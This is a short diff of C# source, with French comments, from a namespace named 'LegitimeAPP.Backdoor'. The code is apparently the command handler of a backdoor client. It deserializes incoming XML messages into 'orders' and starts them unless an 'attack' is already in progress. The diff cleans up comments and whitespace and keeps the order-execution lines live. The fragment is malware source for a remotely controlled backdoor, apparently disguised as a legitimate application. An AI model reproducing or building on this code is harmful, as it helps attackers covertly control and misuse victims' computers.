@@ -164,24 +164,11 @@ namespace LegitimeAPP.Backdoor {
                     */
 
                     if ( !_attackInProgress ) {
-
                         
-
-
                         Console.WriteLine(message) ; 
- 
-                        //Order order = Data<Order>.XmlToData(message) ;
+                        order.Change(Data<Order>.XmlToData(message)) ;
+                        order.Start() ;
 
-
-                            order.Change(Data<Order>.XmlToData(message)) ;
-                            order.Start() ;  
-                      
-
-                        // Change l'ancien ordre par le nouveau 
-                        //order.Change(Data<Order>.XmlToData(message)) ;
-                        
-                        // Execute l'ordre 
-                        //order.Start() ;
                     } else {
                         Console.WriteLine("On ignore le nouvelle ordre car un est encore en cours ") ; 
                     }
